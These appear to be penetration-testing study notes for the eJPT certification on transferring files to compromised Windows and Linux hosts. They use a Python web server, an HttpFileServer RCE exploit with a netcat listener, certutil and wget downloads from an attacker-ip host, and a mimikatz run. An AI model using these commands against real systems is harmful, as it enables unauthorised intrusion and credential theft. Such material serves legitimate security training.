# 51 Transferring Files to Windows & Linux Targets

# Setting up a Web Server with Python

- After obtaining initial access to a target system, you will need to transfer files to the target system.
- In some cases, you will not have access to the target system via a Meterpreter session, and as a result, you will need to use the inbuilt OS specific utilities to facilitate the transfer of file from your system to the target system.
- This process utilizes a two-step approach, where you will need to host the files you want to transfer on a web server and download the files hosted on the web server to the target system.

- Python comes with a build-in module known as SimpleHTTPServer (Python2) and http.server (Python3), that can be used to facilitate a simple HTTP server that gives you standard GET and HEAD request handlers.
- This module can be used to host files in any directory of your system. And can be implemented through a single command in your terminal.

### DEMO

```shell
python -m SimpleHTTPServer <port> # Python 2
python3 -m http.server <port> # Python 3
```


# Transferring files to Windows targets

### DEMO

```shell
# Example with HttpFileServer 2.3.x RCE exploit
searchsploit -m 39161
# Configure the exploit

# Setup Python server with nc.exe
python3 -m http.server 80
# Setup listener
nc -nvlp 1234 

# Run the exploit
python exploit.py <target-ip> <target-port>

# Gained the shell
shell: cd C:\\
shell: mkdir Temp # Better use this directory for upload files
shell: cd Temp

# Setup new Python server for new files upload
python3 -m http.server 80

# Download files with Windows shell, in this case mimikatz.exe
shell: certutil -urlcache -f http://<attacker-ip>/mimikatz.exe mimikataz.exe

# Run executable
.\mimikatz.exe
mimikataz: privilege::debug # Setting privileges
```


# Transferring files to Linux targets

### DEMO

```shell
# Example with Samba smbd 3.X - 4.X
msf6: exploit(linux/samba/is_known_pipename)

# Setup Python http.server

# To download in Linux shell
wget http://<attacker-ip>/file 
```

#cybersecurity #eJPT 